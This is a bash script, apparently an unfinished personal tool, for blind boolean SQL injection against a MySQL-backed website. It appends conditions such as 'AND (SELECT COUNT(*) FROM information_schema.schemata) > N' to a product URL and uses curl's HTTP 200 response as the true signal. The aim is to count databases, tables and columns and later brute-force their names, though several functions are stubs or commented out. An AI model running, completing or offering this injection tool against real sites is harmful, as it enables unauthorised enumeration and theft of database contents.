#!/bin/bash
# get number of tables inside a database:
# the number will start to count by 1 single table is equal to 1!
# (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = '<database>') > 0

# get the number of columns inside a table
# (SELECT COUNT(*) FROM <table>) > 0

# get the length of a column name
# (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema = <table_name>)

# use the length to guess the name of the table

MYSQL_STANDARD_DATABASES=('mysql','information_schema')

function getLength() {
	echo 'i get you the length'
	# store the length in array!
	# required: ??
	# parameter: ??
	# IT Create from three parameter the sqli!
	sqli="SELECT LENGTH(${column}) FROM ${tableName} WHERE ${condition} LIMIT ? OFFSET ?"
}

function encodeToUrl() {
	# it can make some problems! NOT SURE!
	# PROBLEMES can come from the quots
	#echo $(python -c `from urllib.parse import quote; print(quote(\"${1}\"));`)

	# will that solve our Problem?
	echo $(echo "$1" | /usr/bin/jq -Rr '@uri')
}

function getAmount() {
	echo 'i get the amount of the tables/columns/content'
	# required:
	# - database
	# - sqli
	# parameter: ??

	sqlQuery=$1

	tableName='information_schema.tables'
	condition="table_schema = ${database}"
	#sqli=(SELECT COUNT(*) FROM ${tableName} WHERE ${condition}) > 0

	for index in {1..6}; do
		sqli="AND (${sqlQuery}) > $index"
		echo "$sqli"
		request "$sqli"
		echo $?
	done
}

function bruteForceName() {
	echo "i will get the name"
	# required:
	# - length
	# - count
	# - database/table/columns
	# sqli


	#for index in $(seq 1 $length); do
	#	for letter in {a..z} do
	#		echo ''
	#		#request $encodedUrl
	#	done
	#done
}

function request() {
	#echo 'i will take care of the request and also the validation of the response'
	# rquired
	# - parsed url
	# take care of parsing url!
	encodedUrl=$(encodeToUrl "$1")
	echo "$encodedUrl"
	echo "$URL/${PATH}%20${encodedUrl}"
	/usr/bin/curl --silent -i "$URL/${PATH}%20${encodedUrl}" | /usr/bin/head -n 1 | /usr/bin/grep -q '200'
	#/usr/bin/curl --silent -i $URL/"${PATH}%20${encodedUrl}" | /usr/bin/head -n 1
}

#SQLiTablesCount="SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=${database}"
#SQLiColumnsCount="SELECT COUNT(*) FROM ${table}"
#SQLILength="SELECT LENGTH(<column>) FROM information_schema.<column> WHERE <table_schema> = <table_name>"

URL="http://${target}"
PATH="products/1"

# find all datbases that are not standad only the number!
# which are in mysql standard?
# mysql, information_schema

getAmount 'SELECT COUNT(*) FROM information_schema.schemata'
